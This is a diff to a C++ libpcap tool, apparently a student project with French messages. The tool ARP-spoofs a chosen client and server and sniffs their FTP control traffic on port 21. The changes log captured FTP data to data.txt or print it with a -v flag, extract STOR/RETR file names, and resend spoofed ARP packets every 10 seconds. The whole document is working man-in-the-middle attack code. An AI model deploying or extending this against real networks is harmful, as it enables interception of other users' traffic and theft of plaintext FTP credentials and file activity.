@@ -13,6 +13,7 @@
 #include <thread>
 #include <chrono>
 #include <iomanip>
+#include <fcntl.h>
 
 struct eth_header
 {
@@ -77,6 +78,8 @@ uint8_t mac_address_server[6];
 
 uint8_t local_ip_address[4];
 uint8_t local_mac_address[6];
+
+int verbose_flag = 0;
 
 void checkArgs(int argc, char **argv)
 {
@@ -305,13 +308,31 @@ void process_packet(u_char *user_data, const struct pcap_pkthdr *pkthdr, const u
     {
         std::string ftp_data(reinterpret_cast<const char *>(data), data_size);
 
+        if (verbose_flag == 1)
+        {
+            std::cout << ftp_data;
+        }
+        else
+        {
+            int fdfile = open("data.txt", O_CREAT | O_WRONLY | O_APPEND, 0666);
+            if (fdfile == -1)
+            {
+                std::cerr << "Erreur lors de l'ouverture du fichier" << std::endl;
+                exit(1);
+            }
+            write(fdfile, data, data_size);
+            close(fdfile);
+        }
+
         if (ftp_data.find("STOR") != std::string::npos)
         {
-            std::cout << "STOR file name : " << ftp_data << std::endl;
+            std::string filename = ftp_data.substr(ftp_data.find("STOR ") + 4);
+            std::cout << "File name :" << filename << std::endl;
         }
         if (ftp_data.find("RETR") != std::string::npos)
         {
-            std::cout << "RETR file name : " << ftp_data << std::endl;
+            std::string filename = ftp_data.substr(ftp_data.find("RETR ") + 4);
+            std::cout << "File name: " << filename << std::endl;
         }
     }
 }
@@ -319,7 +340,7 @@ void process_packet(u_char *user_data, const struct pcap_pkthdr *pkthdr, const u
 void captureFtpPackets(pcap_t *handle)
 {
     struct bpf_program fp;
-    char filter_exp[] = "port 21"; // Filtre FTP, port 21
+    char filter_exp[] = "port 21"; // ftp cmd port
     bpf_u_int32 net;
 
     if (pcap_compile(handle, &fp, filter_exp, 0, net) == -1)
@@ -340,13 +361,13 @@ void periodicArpSpoofing(pcap_t *handle, uint8_t *packet)
     while (true)
     {
         sendARPSpoofing(packet, handle);
-        std::this_thread::sleep_for(std::chrono::seconds(30));
+        std::this_thread::sleep_for(std::chrono::seconds(10));
     }
 }
 
 void signalHandler(int signum)
 {
-    std::cout << "Interception du signal " << signum << ", restauration des tables ARP et sortie.\n";
+    std::cout << "\nInterception du signal " << signum << ", restauration des tables ARP et sortie.\n";
     uint8_t *packetClient = buildPacketARPRestore(ip_address_client, mac_address_client, ip_address_server, mac_address_server, local_ip_address, local_mac_address);
     uint8_t *packetServer = buildPacketARPRestore(ip_address_server, mac_address_server, ip_address_client, mac_address_client, local_ip_address, local_mac_address);
 
@@ -360,16 +381,30 @@ void signalHandler(int signum)
 int main(int argc, char *argv[])
 {
     char errbuf[PCAP_ERRBUF_SIZE];
-
     signal(SIGINT, signalHandler);
-
-    const char *ipClient = argv[1];
-    const char *macClient = argv[2];
-    const char *ipServer = argv[3];
-    const char *macServer = argv[4];
 
     uint8_t *packetSpoofingClient = nullptr;
     uint8_t *packetSpoofingServer = nullptr;
+
+    int opt;
+
+    while ((opt = getopt(argc, argv, "v")) != -1)
+    {
+        switch (opt)
+        {
+        case 'v':
+            verbose_flag = 1;
+            break;
+        default:
+            fprintf(stderr, "Usage: %s [-v]\n", argv[0]);
+            exit(EXIT_FAILURE);
+        }
+    }
+
+    const char *ipClient = argv[optind];
+    const char *macClient = argv[optind + 1];
+    const char *ipServer = argv[optind + 2];
+    const char *macServer = argv[optind + 3];
 
     checkArgs(argc, argv);
     convertArgsClient(ip_address_client, mac_address_client, ipClient, macClient);
